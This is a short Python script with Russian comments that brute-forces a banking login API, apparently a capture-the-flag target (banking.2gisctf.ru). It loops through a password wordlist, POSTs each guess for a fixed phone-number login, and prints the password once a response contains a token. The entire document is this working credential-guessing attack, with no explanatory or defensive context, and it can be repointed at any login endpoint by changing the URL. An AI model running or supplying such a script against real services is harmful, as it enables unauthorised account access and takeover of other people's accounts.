import requests

# Настройки
login = "+78005553535"   # логин
url = "https://banking.2gisctf.ru/api/login"   # url авторизации
wordlist_path = "secrets.txt"


with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"[+] Загружено {len(passwords)} возможных паролей")

# Перебор
for i, password in enumerate(passwords, 1):
    try:
        data = {
            "login": login,
            "password": password
        }

        response = requests.post(url, json=data)

        if response.status_code == 200 and "token" in response.text.lower():
            print("\n" + "="*40)
            print(f"[+] Найден пароль: {password}")
            print(f"[+] Ответ: {response.text}")
            print("="*40 + "\n")
            break
        else:
            print(f"[{i}] {password} — не подошёл ({response.status_code})")

    except Exception as e:
        print(f"[{i}] Ошибка с паролем {password}: {e}")
